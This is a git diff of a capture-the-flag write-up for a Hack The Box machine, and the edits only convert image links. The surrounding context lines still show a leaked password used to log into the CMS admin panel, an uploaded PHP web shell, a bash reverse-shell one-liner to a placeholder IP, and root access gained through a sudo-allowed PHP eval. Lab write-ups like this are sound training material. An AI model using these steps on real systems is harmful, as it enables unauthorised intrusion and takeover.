@@ -67,7 +67,7 @@ $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
 	- email: `tiffany@dog.htb`
 	- password: `BackDropJ2024DS2024`
 - WOILA, I AM IN
-![[Pasted image 20250707142753.png]]
+![Pasted image 20250707142753](Pasted%20image%2020250707142753.png)
 
 - Now that I am connected to the admin dashboard I can search for a lot of information about the web server
 - I see that that the web server utilizes `backdrop cms` 
@@ -104,8 +104,8 @@ Your shell address: http://10.10.11.58/modules/shell/shell.php
 
 - I go to the address where the exploit tells me to go to install the shell
 after that I click on `Manual Installation`
-![[Pasted image 20250707142905.png]]
-- After that I get redirected here![[Pasted image 20250707143036.png]]
+![Pasted image 20250707142905](Pasted%20image%2020250707142905.png)
+- After that I get redirected here![Pasted image 20250707143036](Pasted%20image%2020250707143036.png)
 
 - The script gave me a `shell.zip` archive but I need and `archive.tar.gz` so lets converted it:
 ```shell
@@ -116,15 +116,15 @@ tar -czvf shell.tar.gz -C temporary .
 ```
 
 - Now we select `shell.tar.gz` we get a successful installation
-![[Pasted image 20250707143258.png]]
+![Pasted image 20250707143258](Pasted%20image%2020250707143258.png)
 
 - And we go to `http://10.10.11.58/modules/shell/shell.php` where we got our shell 
-![[Pasted image 20250707143418.png]]
+![Pasted image 20250707143418](Pasted%20image%2020250707143418.png)
 
 - Now we open a listener on port 4444, to get a reverse shell:
 	- On our machine: `nc -lvnp 4444`
 	- we type in our shell `bash -c 'bash -i >& /dev/tcp/<your_IP>/4444 0>&1'`
-- We got our shell![[Pasted image 20250707143621.png]]
+- We got our shell![Pasted image 20250707143621](Pasted%20image%2020250707143621.png)
 
 - Lets see what users are on the server
 ```shell
@@ -161,11 +161,11 @@ User johncusack may run the following commands on dog:
 ```
 
 - If we try to run `/usr/local/bin/bee` we get a bunch of options
-![[Pasted image 20250707144328.png]]
+![Pasted image 20250707144328](Pasted%20image%2020250707144328.png)
 - We see that we have as global option `--root` where we have to specify the folder of the web server 
 - By going through the root folder `/` we find the web server at `/var/www/html` 
 
-- Now that we have the folder of the server let's find a command which can help us:![[Pasted image 20250707144534.png]]
+- Now that we have the folder of the server let's find a command which can help us:![Pasted image 20250707144534](Pasted%20image%2020250707144534.png)
 - There it is command `eval` which evaluates PHP 
 - So with a wonderful evaluation `"system('id');"` we can see if we get the root id:
 ```shell
@@ -181,5 +181,5 @@ uid=0(root) gid=0(root) groups=0(root)
 sudo /usr/local/bin/bee --root="/var/www/html" eval "system('/bin/bash');"
 ```
 - We get the reverse shell as `root` so we go into `/root` to get the flag from `root.txt` 
-![[Pasted image 20250707144907.png]]
+![Pasted image 20250707144907](Pasted%20image%2020250707144907.png)
 
